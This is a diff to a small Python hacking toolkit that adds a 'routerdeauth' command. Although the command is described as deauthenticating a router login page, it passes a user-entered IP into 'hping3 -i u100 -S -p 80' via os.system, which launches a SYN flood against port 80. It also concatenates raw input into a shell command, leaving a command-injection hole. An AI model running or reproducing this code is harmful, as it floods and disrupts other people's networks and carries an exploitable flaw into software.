@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 
-
 import random
 import sys
 import webbrowser
@@ -41,11 +40,29 @@ def checking_command(command):
         lsdir()
     elif command=="scnport":
         scnport()
+    elif command=="routerdeauth":
+        routerdeauth()
     elif command=="exit":
         exit()
     else:
         print("The specified command is not recognized")
         takeinput()
+
+def routerdeauth():
+    print("Deauthenticate router login page")
+    print("press p to exit")
+    print("(routerdeauth)>",end=" ")
+    ip=input()
+    if(ip=="back"):
+        takeinput()
+    else:
+        inp = input()
+        command="hping3 -i u100 -S -p 80 "+ip
+        os.system(command)
+        if inp=="p":
+            exit()
+        routerdeauth()
+    
 
 def scnport():
     print("scans for open ports in a system")
